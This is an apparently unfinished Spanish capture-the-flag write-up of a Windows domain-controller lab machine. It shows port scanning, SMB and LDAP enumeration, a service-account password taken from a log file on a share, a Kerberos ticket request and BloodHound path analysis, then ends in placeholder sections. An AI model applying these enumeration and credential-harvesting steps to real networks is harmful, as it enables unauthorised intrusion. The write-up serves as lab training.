
# Logging

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Logging`
* **IP:** `10.129.48.91`
* **Sistema operativo:** `Windows`
* **Dificultad:** `🟡 Media`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:purple;">Configuración del host</mark>

La plataforma nos proporciona las credenciales iniciales para esta máquina:

```
wallace.everette / Welcome2026@
```

#### /etc/passwd

Añadimos la IP a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.129.48.91 logging.htb" | sudo tee -a /etc/hosts
```

## <mark style="color:purple;">Escaneo de puertos</mark>

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.48.91
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-27 03:43:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Encontramos multitud de puertos abiertos, lo normal en máquinas Windows. Ademas nos encontramos con que la máquina objetivo es un Domain Controller, por la presencia de los puertos 3268 o 389, reservados para DCs.

Destacan los puertos:

* `111 (RPC)` - Puede contener recursos compartidos o enumerar usuarios
* `445 (SMB)` - Recursos compartidos y enumeración
* `5985 (WinRM)` - Acceso con EvilWinRM con contraseña
* `88 (Kerberos)` - Posible Kerberoasting o AS-REP Roasting

***

## <mark style="color:purple;">Acceso web</mark>

Solo nos encontramos la típica página de inicio de un Windows Server:

<figure><img src="/files/yaQ2ouOsY3WQwqKop8Zh" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Enumeración web</mark>

### Análisis de vulnerabilidades

Analizando el objetivo con Nuclei encontramos un `ldap-anonymous-login`:

```bash
nuclei -u logging.htb

   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

		projectdiscovery.io

[waf-detect:aspgeneric] [http] [info] http://logging.htb
[iis-shortname-detect] [http] [info] http://logging.htb/*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://logging.htb/3xyn4fpo*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://logging.htb/*~1*/a.aspx
[ldap-metadata] [javascript] [info] logging.htb:389 ["DefaultNamingContext: DC=logging,DC=htb","DomainFunctionality: 7","ForestFunctionality: 7","DomainControllerFunctionality: 7","BaseDN: dc=389","DnsHostName: DC01.logging.htb"]
[smb-version-detect:smb-version] [javascript] [info] logging.htb:445 ["SMB 2.1"]
[smb2-server-time] [javascript] [info] logging.htb:445 ["SystemTime: 2026-04-27T03:49:08.000Z ServerStartTime: 2009-04-22T19:24:48.000Z"]
[smb2-capabilities] [javascript] [info] logging.htb:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[ldap-anonymous-login-detect] [javascript] [medium] logging.htb:389
[smb-enum] [javascript] [info] logging.htb:445 ["NetBIOSComputerName: DC01","NetBIOSDomainName: logging","DNSComputerNamen: DC01.logging.htb","DNSComputerName: DC01.logging.htb","ForestName: logging.htb","OSVersion: 10.0.17763"]
[smb-enum-domains] [javascript] [info] logging.htb:445 ["DomainName: logging.htb"]
[smb-os-detect] [javascript] [info] logging.htb:445 ["Windows Server 2019, Version 1809"]
```

***

## <mark style="color:purple;">Enumeración inicial</mark>

#### Con usuario y contraseña

```bash
enum4linux-ng -A -u 'wallace.everette' -p 'Welcome2026@' logging.htb

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... logging.htb
[*] Username ......... 'wallace.everette'
[*] Random Username .. 'uiqcdtpg'
[*] Password ......... 'Welcome2026@'
[*] Timeout .......... 5 second(s)

 ====================================
|    Listener Scan on logging.htb    |
 ====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ===================================================
|    Domain Information via LDAP for logging.htb    |
 ===================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: logging.htb

 ==========================================================
|    NetBIOS Names and Workgroup/Domain for logging.htb    |
 ==========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ========================================
|    SMB Dialect Check on logging.htb    |
 ========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ==========================================================
|    Domain Information via SMB session for logging.htb    |
 ==========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: logging
DNS domain: logging.htb
FQDN: DC01.logging.htb
Derived membership: domain member
Derived domain: logging

 ========================================
|    RPC Session Check on logging.htb    |
 ========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for user session
[+] Server allows session using username 'wallace.everette', password 'Welcome2026@'
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ==================================================
|    Domain Information via RPC for logging.htb    |
 ==================================================
[+] Domain: logging
[+] Domain SID: S-1-5-21-4020823815-2796529489-1682170552
[+] Membership: domain member

 ==============================================
|    OS Information via RPC for logging.htb    |
 ==============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102f'
Server type string: Wk Sv Sql PDC Tim NT

 ====================================
|    Users via RPC on logging.htb    |
 ====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 12 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 12 user(s) via 'enumdomusers'
[+] After merging user results we have 12 user(s) total:
'2104':
  username: svc_recovery
  name: (null)
  acb: '0x00000210'
  description: (null)
'2105':
  username: jaylee.clifton
  name: (null)
  acb: '0x00000210'
  description: (null)
'2106':
  username: monique.chip
  name: (null)
  acb: '0x00000210'
  description: (null)
'2107':
  username: kyson.abel
  name: (null)
  acb: '0x00000210'
  description: (null)
'2108':
  username: fable.milford
  name: (null)
  acb: '0x00000210'
  description: (null)
'2109':
  username: wellington.kylan
  name: (null)
  acb: '0x00000210'
  description: (null)
'2110':
  username: serina.philander
  name: (null)
  acb: '0x00000210'
  description: (null)
'2111':
  username: wallace.everette
  name: (null)
  acb: '0x00000210'
  description: (null)
'2112':
  username: toby.brynleigh
  name: (null)
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00000011'
  description: Key Distribution Center Service Account

 =====================================
|    Groups via RPC on logging.htb    |
 =====================================
[*] Enumerating local groups
[+] Found 7 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 28 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 18 group(s) via 'enumdomgroups'
[+] After merging groups results we have 53 group(s) total:
'1101':
  groupname: DnsAdmins
  type: local
'1102':
  groupname: DnsUpdateProxy
  type: domain
'2101':
  groupname: Emergency Recovery
  type: domain
'2102':
  groupname: IT
  type: domain
'2103':
  groupname: HR
  type: domain
'2601':
  groupname: WSUS Administrators
  type: local
'2602':
  groupname: WSUS Reporters
  type: local
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'512':
  groupname: Domain Admins
  type: domain
'513':
  groupname: Domain Users
  type: domain

<----SNIP---->

 =====================================
|    Shares via RPC on logging.htb    |
 =====================================
[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
Logs:
  comment: ''
  type: Disk
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
WSUSTemp:
  comment: A network share used by Local Publishing from a Remote WSUS Console Instance.
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share Logs
[+] Mapping: OK, Listing: OK
[*] Testing share NETLOGON
[-] Could not parse result of smbclient command, please open a GitHub issue
[*] Testing share SYSVOL
[-] Could not check share: timed out
[*] Testing share WSUSTemp
[+] Mapping: OK, Listing: DENIED
```

Encontramos `12 usuarios` en el sistema y un share `Logs` accesible.

### Share Logs

Enumerando el share Logs encontramos 4 archivos que pueden contener credenciales:

```bash
smbclient //logging.htb/Logs -U 'wallace.everette%Welcome2026@'

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr 17 07:10:09 2026
  ..                                  D        0  Fri Apr 17 07:10:09 2026
  Audit_Heartbeat.log                 A     1294  Fri Apr 17 07:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Fri Apr 17 07:10:09 2026
  Service_State.log                   A      468  Fri Apr 17 07:10:09 2026
  TaskMonitor.log                     A     1170  Fri Apr 17 07:10:09 2026

		6657279 blocks of size 4096. 1099561 blocks available

smb: \> get Audit_Heartbeat.log 
getting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log (7,3 KiloBytes/sec) (average 7,3 KiloBytes/sec)
smb: \> get IdentitySync_Trace_20260219.log 
getting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log (49,3 KiloBytes/sec) (average 28,0 KiloBytes/sec)
smb: \> get Service_State.log 
getting file \Service_State.log of size 468 as Service_State.log (2,5 KiloBytes/sec) (average 19,2 KiloBytes/sec)
smb: \> get TaskMonitor.log 
getting file \TaskMonitor.log of size 1170 as TaskMonitor.log (6,9 KiloBytes/sec) (average 16,2 KiloBytes/sec)
```

En el archivo `IdentitySync_Trace_20260219.log` encontramos unas credenciales de `svc_recovery`:

```bash
  27   │ [2026-02-09 03:00:02.215] [PID:4102] [Thread:12] INFO  - Establishing SQL session with HR01.logging.htb...
  28   │ [2026-02-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0
  29   │ [2026-02-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).
  30   │ [2026-02-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
  31   │ [2026-02-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
  32   │ [2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\s
       │ vc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
```

Y una conexión SQL:

```bash
  69   │ [2026-03-09 03:00:02.215] [PID:4102] [Thread:12] INFO  - Establishing SQL session with HR01.logging.htb...
  70   │ [2026-03-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0
  71   │ [2026-03-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).
  72   │ [2026-03-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
  73   │ [2026-03-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
  74   │ [2026-03-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Success LdapConnection object...
```

#### Credenciales encontradas

* **Usuario:** `LOGGING\svc_recovery`
* **Contraseña:** `Em3rg3ncyPa$$2025`

Y un servidor SQL: `HR01.logging.htb`

### <mark style="color:purple;">Obtener TGT de svc\_recovery</mark>

```bash
impacket-getTGT -dc-ip 10.129.48.91 LOGGING.HTB/svc_recovery

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in svc_recovery.ccache
```

***

## <mark style="color:purple;">Enumeración de Active Directory</mark>

### Extracción de información LDAP

```bash
ldapsearch -x -H ldap://logging.htb -D "wallace.everette@LOGGING.HTB" -w 'Welcome2026@' -b "dc=logging,dc=htb" > ldapsearch.txt

cat ldapsearch.txt
```

#### Resumen de hallazgos clave del LDAP

1. **`toby.brynleigh` es Domain Admin** (y miembro de Administradores)
2. **`svc_recovery` está en Protected Users** → no podemos usar NTLM, solo Kerberos AES
3. **Grupo `WSUS Administrators` existe** pero vacío por ahora
4. **`msa_health`** es una Managed Service Account con delegación a Remote Management Users
5. **`jaylee.clifton`** está en Performance Log Users (posible acceso a logs sensibles)

### Enumeración de usuarios

```bash
crackmapexec smb logging.htb -u wallace.everette -p 'Welcome2026@' --users

SMB         logging.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         logging.htb     445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
SMB         logging.htb     445    DC01             [+] Enumerated domain user(s)
SMB         logging.htb     445    DC01             logging.htb\toby.brynleigh                 badpwdcount: 0 desc: 
SMB         logging.htb     445    DC01             logging.htb\wallace.everette               badpwdcount: 0 desc: 
SMB         logging.htb     445    DC01             logging.htb\serina.philander               badpwdcount: 0 desc: 
SMB         logging.htb     445    DC01             logging.htb\wellington.kylan               badpwdcount: 0 desc: 
SMB         logging.htb     445    DC01             logging.htb\fable.milford                  badpwdcount: 0 desc: 
SMB         logging.htb     445    DC01             logging.htb\kyson.abel                     badpwdcount: 0 desc: 
SMB         logging.htb     445    DC01             logging.htb\monique.chip                   badpwdcount: 0 desc: 
SMB         logging.htb     445    DC01             logging.htb\jaylee.clifton                 badpwdcount: 0 desc: 
SMB         logging.htb     445    DC01             logging.htb\svc_recovery                   badpwdcount: 0 desc: 
SMB         logging.htb     445    DC01             logging.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         logging.htb     445    DC01             logging.htb\Guest                          badpwdcount: 2 desc: Built-in account for guest access to the computer/domain
SMB         logging.htb     445    DC01             logging.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

Añadimos los usuarios encontramos a un archivo `valid-users.txt`. Probar a volcar tickets Kerberos mediante ASREP-Roasting falla:

```bash
impacket-GetNPUsers logging.htb/ -usersfile valid-users.txt -dc-ip 10.129.48.91

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User wallace.everette doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User serina.philander doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wellington.kylan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fable.milford doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kyson.abel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User monique.chip doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jaylee.clifton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_recovery doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Enumeración de grupos

```bash
crackmapexec smb logging.htb -u wallace.everette -p 'Welcome2026@' --groups

SMB         logging.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         logging.htb     445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
SMB         logging.htb     445    DC01             [+] Enumerated domain group(s)
SMB         logging.htb     445    DC01             WSUS Reporters                           membercount: 0
SMB         logging.htb     445    DC01             WSUS Administrators                      membercount: 0
SMB         logging.htb     445    DC01             HR                                       membercount: 1
SMB         logging.htb     445    DC01             IT                                       membercount: 1
SMB         logging.htb     445    DC01             Emergency Recovery                       membercount: 1
SMB         logging.htb     445    DC01             DnsUpdateProxy                           membercount: 0
SMB         logging.htb     445    DC01             DnsAdmins                                membercount: 0
SMB         logging.htb     445    DC01             Enterprise Key Admins                    membercount: 0
SMB         logging.htb     445    DC01             Key Admins                               membercount: 0
SMB         logging.htb     445    DC01             Protected Users                          membercount: 2
SMB         logging.htb     445    DC01             Cloneable Domain Controllers             membercount: 0
SMB         logging.htb     445    DC01             Enterprise Read-only Domain Controllers  membercount: 0
SMB         logging.htb     445    DC01             Read-only Domain Controllers             membercount: 0
SMB         logging.htb     445    DC01             Denied RODC Password Replication Group   membercount: 8
SMB         logging.htb     445    DC01             Allowed RODC Password Replication Group  membercount: 0
SMB         logging.htb     445    DC01             Terminal Server License Servers          membercount: 0
SMB         logging.htb     445    DC01             Windows Authorization Access Group       membercount: 1
SMB         logging.htb     445    DC01             Incoming Forest Trust Builders           membercount: 0
SMB         logging.htb     445    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
SMB         logging.htb     445    DC01             Account Operators                        membercount: 0
SMB         logging.htb     445    DC01             Server Operators                         membercount: 0
SMB         logging.htb     445    DC01             RAS and IAS Servers                      membercount: 0
SMB         logging.htb     445    DC01             Group Policy Creator Owners              membercount: 1
SMB         logging.htb     445    DC01             Domain Guests                            membercount: 0
SMB         logging.htb     445    DC01             Domain Users                             membercount: 0
SMB         logging.htb     445    DC01             Domain Admins                            membercount: 2
SMB         logging.htb     445    DC01             Cert Publishers                          membercount: 1
SMB         logging.htb     445    DC01             Enterprise Admins                        membercount: 1
SMB         logging.htb     445    DC01             Schema Admins                            membercount: 1
SMB         logging.htb     445    DC01             Domain Controllers                       membercount: 0
SMB         logging.htb     445    DC01             Domain Computers                         membercount: 0
SMB         logging.htb     445    DC01             Storage Replica Administrators           membercount: 0
SMB         logging.htb     445    DC01             Remote Management Users                  membercount: 1
SMB         logging.htb     445    DC01             Access Control Assistance Operators      membercount: 0
SMB         logging.htb     445    DC01             Hyper-V Administrators                   membercount: 0
SMB         logging.htb     445    DC01             RDS Management Servers                   membercount: 0
SMB         logging.htb     445    DC01             RDS Endpoint Servers                     membercount: 0
SMB         logging.htb     445    DC01             RDS Remote Access Servers                membercount: 0
SMB         logging.htb     445    DC01             Certificate Service DCOM Access          membercount: 1
SMB         logging.htb     445    DC01             Event Log Readers                        membercount: 0
SMB         logging.htb     445    DC01             Cryptographic Operators                  membercount: 0
SMB         logging.htb     445    DC01             IIS_IUSRS                                membercount: 0
SMB         logging.htb     445    DC01             Distributed COM Users                    membercount: 0
SMB         logging.htb     445    DC01             Performance Log Users                    membercount: 1
SMB         logging.htb     445    DC01             Performance Monitor Users                membercount: 0
SMB         logging.htb     445    DC01             Network Configuration Operators          membercount: 0
SMB         logging.htb     445    DC01             Remote Desktop Users                     membercount: 0
SMB         logging.htb     445    DC01             Replicator                               membercount: 0
SMB         logging.htb     445    DC01             Backup Operators                         membercount: 0
SMB         logging.htb     445    DC01             Print Operators                          membercount: 0
SMB         logging.htb     445    DC01             Guests                                   membercount: 2
SMB         logging.htb     445    DC01             Users                                    membercount: 3
SMB         logging.htb     445    DC01             Administrators                           membercount: 4
```

### Ver usuarios de grupos interesantes

```bash
net rpc user info wallace.everette -U "logging/wallace.everette%Welcome2026@" -S logging.htb

Domain Users
```

```bash
net rpc group members "Emergency Recovery" -U "logging/wallace.everette%Welcome2026@" -S logging.htb
logging\svc_recovery

net rpc group members "IT" -U "logging/wallace.everette%Welcome2026@" -S logging.htb
logging\jaylee.clifton

net rpc group members "HR" -U "logging/wallace.everette%Welcome2026@" -S logging.htb
logging\wellington.kylan
```

### Shares - Recursos compartidos

```bash
crackmapexec smb logging.htb -u wallace.everette -p 'Welcome2026@' --shares

SMB         logging.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         logging.htb     445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
SMB         logging.htb     445    DC01             [+] Enumerated shares
SMB         logging.htb     445    DC01             Share           Permissions     Remark
SMB         logging.htb     445    DC01             -----           -----------     ------
SMB         logging.htb     445    DC01             ADMIN$                          Remote Admin
SMB         logging.htb     445    DC01             C$                              Default share
SMB         logging.htb     445    DC01             IPC$            READ            Remote IPC
SMB         logging.htb     445    DC01             Logs            READ            
SMB         logging.htb     445    DC01             NETLOGON        READ            Logon server share 
SMB         logging.htb     445    DC01             SYSVOL          READ            Logon server share 
SMB         logging.htb     445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

Encontramos los shares que ya descubrimos anteriormente.

#### Resumen de hallazgoswa

* **`svc_recovery`** está en `Emergency Recovery` (y `Protected Users`)
* **`jaylee.clifton`** está en `IT`
* **`wellington.kylan`** está en `HR`
* **`toby.brynleigh`** es Domain Admin
* **`msa_health`** está en `Remote Management Users`
* Los grupos `WSUS Administrators` y `WSUS Reporters` están **vacíos**
* No hay usuarios con `UF_DONT_REQUIRE_PREAUTH`

***

## <mark style="color:purple;">Enumeración con Bloodhound</mark>

### Bloodhound Python

```bash
bloodhound-python -d logging.htb -u wallace.everette -p 'Welcome2026@' -ns 10.129.48.91 -c All

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: logging.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.logging.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.logging.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.logging.htb
INFO: Found 14 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.logging.htb
INFO: Done in 00M 08S
```

### Análisis con Bloodhound

El usuario `svc_recovery` del cual tenemos credenciales tiene permisos Generic Write sobre el usuario `MSA_HEALTH`

<figure><img src="/files/CuLVTuGnn4jpzWWYXsjk" alt=""><figcaption></figcaption></figure>

`MSA_HEALTH` es miembro de Remote Management Users

***

## <mark style="color:purple;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
type C:\Users\[usuario]\Desktop\user.txt
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración básica

```
whoami /priv && systeminfo && net user [usuario]
```

### Herramientas automatizadas

```
WinPEAS, Seatbelt
```

#### Técnicas comunes

* **Token impersonation**
* **Abuso de servicios Windows**
* **Credenciales en claro**

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
type C:\Users\Administrator\Desktop\root.txt
```
